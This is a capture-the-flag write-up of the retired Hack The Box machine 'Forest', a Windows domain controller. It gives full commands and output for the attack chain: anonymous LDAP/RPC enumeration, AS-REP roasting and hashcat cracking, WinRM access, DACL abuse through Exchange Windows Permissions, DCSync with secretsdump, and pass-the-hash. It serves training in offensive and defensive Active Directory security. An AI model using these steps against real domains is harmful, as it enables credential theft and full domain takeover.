<p align="center">
  <img src="../assets/branding/nu11s3c-banner.svg" alt="nu11s3c security writeups" width="100%" />
</p>

# forest - hack the box

**platform:** Hack The Box · retired machine  
**os:** Windows Server 2016 Standard · build 14393  
**outcome:** WinRM access as `svc-alfresco` through AS-REP roasting; domain-object ACL control through nested groups and Exchange Windows Permissions; DCSync; Administrator WinRM through pass-the-hash  
**focus:** TCP/UDP enumeration · anonymous LDAP and RPC · Kerberos preauthentication · Hashcat · WinRM · nested AD groups · access tokens · `GenericAll` / `WriteDacl` · AD security descriptors · DCSync · NTLM pass-the-hash

---

## `00 / prep`


started with the usual fish engagement variables and tmux logging

```fish
mkdir -p loot logs notes scans

# env.fish
set -gx ENGAGEMENT_DIR (pwd -P)
set -gx ENGAGEMENT "forest"
set -gx IP "<TARGET_IP>"

if set -q TMUX
    set -l session (tmux display-message -p '#S')
    tmux set-environment -t "$session" ENGAGEMENT "$ENGAGEMENT"
    tmux set-environment -t "$session" IP "$IP"
    tmux set-environment -t "$session" ENGAGEMENT_DIR "$ENGAGEMENT_DIR"
end
```

```fish
source ./env.fish
```


---

## `01 / recon`



### service discovery

started with service detection, followed by all TCP ports and the top 100 UDP ports:

```fish
nmap -sVC -oA scans/initial $IP
nmap -p- --min-rate 1000 -oA scans/allports $IP
nmap -sUV --top-ports 100 -oA scans/udp $IP
```


```text
53/tcp    open  domain           Simple DNS Plus
88/tcp    open  kerberos-sec     Microsoft Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap             Microsoft Active Directory LDAP
445/tcp   open  microsoft-ds     Windows Server 2016 Standard 14393
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
```

UDP scan confirmed DNS on 53, Kerberos on 88, and NTP on 123; 137, 138, 500, 4500, and 5353 were `open|filtered`, not confirmed open services

```text
Computer name: FOREST
Domain:        htb.local
FQDN:          FOREST.htb.local
OS:            Windows Server 2016 Standard
SMB signing:   enabled and required
```

Kerberos, LDAP, SMB, the Global Catalog, and AD Web Services all pointed to a domain controller. WinRM on 5985 was worth remembering if I found valid credentials

### anonymous LDAP

queried LDAP RootDSE without credentials:

```fish
ldapsearch -x -H ldap://$IP -s base -b "" defaultNamingContext namingContexts dnsHostName
```

```text
defaultNamingContext: DC=htb,DC=local
dnsHostName: FOREST.htb.local
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
```

`-x` requests simple authentication; here there were no bind credentials. RootDSE gave me the base DN for subsequent searches

```fish
ldapsearch -x -H ldap://$IP -b 'DC=htb,DC=local' \
  -s sub '(objectClass=user)' dn sAMAccountName
```

this returned 30 entries: built-in accounts, Exchange-related mailboxes, `FOREST$`, `EXCH01$`, and named users including `sebastien`, `lucinda`, `andy`, `mark`, and `santi`

```fish
ldapsearch -LLL -x -H ldap://$IP -b 'DC=htb,DC=local' \
  '(&(objectCategory=person)(objectClass=user))' \
  sAMAccountName description memberOf userAccountControl servicePrincipalName \
  > loot/ldap-users.ldif
```

### anonymous RPC

```fish
rpcclient -U "" -N $IP -c 'enumdomusers'
```

```text
user:[Administrator] rid:[0x1f4]
user:[krbtgt]       rid:[0x1f6]
user:[sebastien]    rid:[0x479]
user:[lucinda]      rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy]         rid:[0x47e]
```

RPC exposed a service account that the LDAP query had missed. followed the RID

```fish
rpcclient -U "" -N $IP -c 'queryuser 0x47b'
```

```text
User Name                : svc-alfresco
user_rid                 : 0x47b
acb_info                 : 0x00010210
Password must change Time: [far-future timestamp]
```

`acb_info : 0x00010210` is a Samba ACB bitmask, not the same numeric encoding used for LDAP `userAccountControl`:

| flag | meaning | relevance |
|---|---|---|
| `0x00000010` | normal user account | ordinary domain account |
| `0x00000200` | password never expires | account password does not expire automatically |
| `0x00010000` | **Kerberos preauthentication not required** | an AS-REP can be requested without knowing the password |

that final flag made `svc-alfresco` a candidate for AS-REP roasting

---

## `02 / initial access: AS-REP roasting`


### obtaining a response without knowing the password

```fish
impacket-GetNPUsers 'htb.local/svc-alfresco' -no-pass \
  -dc-ip "$IP" -outputfile loot/svc-alfresco.asrep
```

```text
[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:[REDACTED]
```

`-no-pass` is the important option: I wasn't supplying the account password. because the account didn't require preauthentication, the domain controller returned an encrypted AS-REP that could be tested offline. the `$23` field identified RC4-HMAC / Kerberos etype 23

### offline password recovery

```fish
hashcat -m 18200 -a 0 loot/svc-alfresco.asrep \
  /usr/share/wordlists/rockyou.txt --status
```

```text
Hash.Mode  : 18200 (Kerberos 5, etype 23, AS-REP)
Status     : Cracked
Recovered  : 1/1 (100.00%)
```

`-m 18200` selects the AS-REP format; `-a 0` is a dictionary attack. the result gave me working credentials for `svc-alfresco`

### validating access

```fish
nxc smb $IP -d htb.local -u svc-alfresco -p "$SVC_ALFRESCO_PASS" --shares
```

```text
[+] htb.local\svc-alfresco:[REDACTED]
Share     Permissions
IPC$      READ
NETLOGON  READ
SYSVOL    READ
```

SMB authentication worked, but the administrative shares weren't accessible. I also checked WinRM:

```fish
nxc winrm $IP -d htb.local -u svc-alfresco -p "$SVC_ALFRESCO_PASS"
```

```text
[+] htb.local\svc-alfresco:[REDACTED] (Pwn3d!)
```

```fish
evil-winrm -i $IP -u svc-alfresco -p "$SVC_ALFRESCO_PASS"
```

```text
Info: Connection successful
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
```

had a foothold on the domain controller, but not an Administrator session

---

## `03 / understanding the account's AD permissions`

---

### the token showed a useful group

```powershell
whoami /all
```

selected group memberships:

```text
BUILTIN\Account Operators
BUILTIN\Remote Management Users
HTB\Privileged IT Accounts
HTB\Service Accounts
Mandatory Label\Medium Mandatory Level
```

`Account Operators` stood out. the next question was how `svc-alfresco` inherited that membership

`net user svc-alfresco /domain` showed `Domain Users` and `Service Accounts`, which seemed inconsistent until I checked the nesting directly:

```powershell
Get-ADGroup 'Service Accounts' -Properties member,memberOf | Format-List Name,member,memberOf

Get-ADGroup 'Privileged IT Accounts' -Properties member,memberOf | Format-List Name,member,memberOf
```

```text
Service Accounts
  member   : svc-alfresco
  memberOf : Privileged IT Accounts

Privileged IT Accounts
  member   : Service Accounts
  memberOf : Account Operators, Remote Management Users
```

that explains why `Account Operators` appeared in the token. `net user` hadn't shown the full nested membership relationship

### the Exchange Windows Permissions group

Exchange groups stood out in the group inventory, especially `Exchange Windows Permissions`.
inspected the ACL of that group object:

```powershell
$g = Get-ADGroup 'Exchange Windows Permissions'
$groupAcl = Get-Acl "AD:\$($g.DistinguishedName)"
$groupAcl.Access | Select-Object -First 5
```


```text
IdentityReference     : BUILTIN\Account Operators
ActiveDirectoryRights : GenericAll
AccessControlType     : Allow
IsInherited           : False
```

this ACL belongs to the *Exchange Windows Permissions group*, not the domain. `GenericAll` means Account Operators can broadly control that group object, including its membership, subject to other applicable protections

```text
svc-alfresco -> Service Accounts -> Privileged IT Accounts
             -> Account Operators -> GenericAll on Exchange Windows Permissions
```

### inspecting the domain ACL

```powershell
(Get-Acl 'AD:\DC=htb,DC=local').Access | Where-Object { $_.IdentityReference -like '*Exchange Windows Permissions*' } | Format-List IdentityReference,ActiveDirectoryRights,AccessControlType
```

there were many ACEs, most related to particular properties, child-object creation, or deletion. two were the important ones:

```text
IdentityReference     : HTB\Exchange Windows Permissions
ActiveDirectoryRights : DeleteTree, WriteDacl
AccessControlType     : Allow
InheritanceType       : All
PropagationFlags      : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2

# A second ACE had InheritedObjectType:
# 4828cc14-1437-45bc-9b07-ad6f015e5f28
```

`WriteDacl` allows modification of an object's discretionary access control list. the inherited-object GUIDs describe which descendant classes can inherit the ACE; they don't automatically make an `InheritanceType: All` rule ineffective on the current domain object. I didn't treat the ACL listing alone as proof of effective access — that would require an actual write followed by a fresh read

---

## `04 / group membership & token refresh`


### checking before changing

```powershell
Get-ADGroupMember 'Exchange Windows Permissions' |
  Select-Object Name,SamAccountName,ObjectClass
```

```text
Exchange Trusted Subsystem  Exchange Trusted Subsystem  group
```

initially the Exchange group had only its preexisting direct member. previewed the change first:

```powershell
add-adgroupmember -identity 'Exchange Windows Permissions' -members 'svc-alfresco' -whatif
```

```text
What if: Performing the operation "Set" on target
"CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local".
```

`-whatif` shows the proposed operation. it doesn't prove the call will be authorized, and it doesn't change the directory. the real write was:

```powershell
Add-ADGroupMember -Identity 'Exchange Windows Permissions' -Members 'svc-alfresco' -ErrorAction Stop
(Get-ADGroup 'Exchange Windows Permissions' -Properties member).member
```

```text
CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
```

this was the first confirmed modification

### the change didn't stay in AD

a later read returned only `Exchange Trusted Subsystem`. the account had disappeared from the group's `member` attribute. repeated tests showed I could add it, but the change was subsequently removed. didn't establish what was removing it

I opened another Evil-WinRM session promptly while membership was present. compared `whoami /groups` in the old and new sessions:

```text
old token: HTB\Exchange Windows Permissions  [not present]
new token: HTB\Exchange Windows Permissions  [enabled]
```

when the AD group membership later disappeared, the new session **still** carried the Exchange Windows Permissions SID

---

## `05 / writing the domain object's DACL`



### the object that needed changing

with effective `WriteDacl`, I could add an ACE giving my existing user SID broad access over `DC=htb,DC=local`

this was the broader `GenericAll` route I actually practiced. a narrower alternative would be to grant only the replication extended rights needed for DCSync, but that is not what I did here

### loading the AD provider and building the rule

after reconnecting, `Get-Acl` initially failed because the `AD:` drive was missing, even though AD cmdlets had worked before. the provider drive was available again before I continued; the exact recovery command wasn't captured in my notes. useful checks are:

```powershell
Import-Module ActiveDirectory
Get-PSDrive AD
```

rebuilt the ACL modification:

```powershell
$path = 'AD:\DC=htb,DC=local'
$acl = Get-Acl $path
$sid = (Get-ADUser svc-alfresco).SID
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid,[System.DirectoryServices.ActiveDirectoryRights]::GenericAll,[System.Security.AccessControl.AccessControlType]::Allow)
$acl.AddAccessRule($rule)
```

`$sid` is the user identity, `$rule` is an `Allow: GenericAll` ACE, and `$acl.AddAccessRule($rule)` changes the in-memory ACL object

```powershell
$rule | Get-Member -MemberType Property
$rule | Format-List *
```

### back up, verify, write, read again

backed up a fresh directory read

```powershell
(Get-Acl $path).Sddl | Set-Content "$env:TEMP\forest-domain-acl-before.sddl"
```

validated the proposed ACE against the SID

```powershell
$acl.GetAccessRules($true,$true,[System.Security.Principal.SecurityIdentifier]) | Where-Object { $_.IdentityReference.Value -eq $sid.Value } | Format-List IdentityReference,ActiveDirectoryRights,AccessControlType,InheritanceType
```

```text
IdentityReference     : S-1-5-21-...-1147
ActiveDirectoryRights : GenericAll
AccessControlType     : Allow
InheritanceType       : None
```

`GenericAll` permission is broad, but it is not the same thing as becoming a Domain Admin

used `Set-Acl` for the directory write:

```powershell
Set-Acl -Path $path -AclObject $acl -ErrorAction Stop
```

**verification had to come from a new read**, because inspecting `$acl` again would only show what I *intended* to write

```powershell
(Get-Acl 'AD:\DC=htb,DC=local').GetAccessRules($true,$true,[System.Security.Principal.SecurityIdentifier]) | Where-Object { $_.IdentityReference.Value -eq $sid.Value } | Format-List IdentityReference,ActiveDirectoryRights,AccessControlType,InheritanceType
```

```text
IdentityReference     : S-1-5-21-...-1147
ActiveDirectoryRights : GenericAll
AccessControlType     : Allow
InheritanceType       : None
```


---

## `06 / DCSync`



```fish
impacket-secretsdump -just-dc-user svc-alfresco \
  "htb.local/svc-alfresco@$IP"
```

```text
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\svc-alfresco:1147:[LM_HASH_REDACTED]:[NT_HASH_REDACTED]:::
[*] Kerberos keys grabbed
[*] Cleaning up...
```

`-just-dc-user` restricted the request to one identity; the command authenticated as `svc-alfresco`. this proved that the replication operation worked, not merely that a `GenericAll` ACE existed


```fish
impacket-secretsdump -just-dc-user Administrator \
  "htb.local/svc-alfresco@$IP"
```

```text
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:[LM_HASH_REDACTED]:[NT_HASH_REDACTED]:::
[*] Kerberos keys grabbed
[*] Cleaning up...
```

RID `500` identified the Administrator account. 

this is why domain-object `WriteDacl` is so dangerous: an account that can change access rules on the domain object may be able to give itself permissions to replicate sensitive credential material, even without joining Domain Admins

---

## `07 / pass-the-hash`


DCSync gave me the Administrator NT hash, not the plaintext password. NTLM authentication can use the hash directly when the endpoint supports it, so I tried Evil-WinRM with `-H`:

```fish
evil-winrm -i $IP -u Administrator -H '<ADMINISTRATOR_NT_HASH>'
```

```text
Evil-WinRM shell v4.1
Info: Establishing connection to remote endpoint
Info: Connection successful
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
```

successful authentication plus `whoami` established an Administrator security context on the host

---

## `08 / findings and lessons`


### systems / methods / findings

| system / object | method | finding |
|---|---|---|
| TCP / UDP | service and port enumeration | identified `FOREST.htb.local` as a Windows Server 2016 domain controller with LDAP, Kerberos, SMB, and WinRM |
| LDAP / RPC | anonymous directory enumeration | LDAP revealed user accounts; RPC exposed an additional `svc-alfresco` account and its preauthentication setting |
| Kerberos | AS-REP roasting and offline dictionary attack | recovered a working password for `svc-alfresco` |
| SMB / WinRM | credential validation | SMB shares readable; WinRM foothold established |
| AD groups | token and nested-membership inspection | `svc-alfresco` inherited Account Operators through Service Accounts and Privileged IT Accounts |
| Exchange Windows Permissions | group-object ACL review | Account Operators had `GenericAll` over the group |
| AD domain object | ACL review | Exchange Windows Permissions had `WriteDacl` ACEs on `DC=htb,DC=local` |
| AD group membership | `Add-ADGroupMember` and fresh logon | temporary membership changed the new token; directory membership was later removed |
| AD domain object | `ActiveDirectoryAccessRule`, `Set-Acl`, fresh `Get-Acl` | direct `Allow: GenericAll` ACE for `svc-alfresco` persisted |
| DRSUAPI | targeted `secretsdump` replication | returned selected account credentials, including Administrator's NT hash |
| WinRM / NTLM | pass-the-hash | authenticated as `htb\administrator` |

### methodology

- one enumeration source wasn't enough. anonymous LDAP missed `svc-alfresco`; RPC found it
- a group name is not an access right. follow *membership nesting*, then inspect the ACL on the actual target object
- `GenericAll` over a **group** and `WriteDacl` over the **domain object** were separate permissions, and both mattered
- `-WhatIf` previews an operation; silence after a write isn't proof of success. verify the resulting `member` attribute or ACL
- AD membership and an existing access token are different snapshots. the new WinRM session retained a group SID after the directory membership disappeared
- PowerShell ACL objects aren't text. `Get-Member` exposes real property names; type-aware SID comparisons avoid false negatives
- `AddAccessRule()` changes a local object. only a directory write followed by a fresh read proves the ACE persisted


---

<sub>nu11s3c </sub>
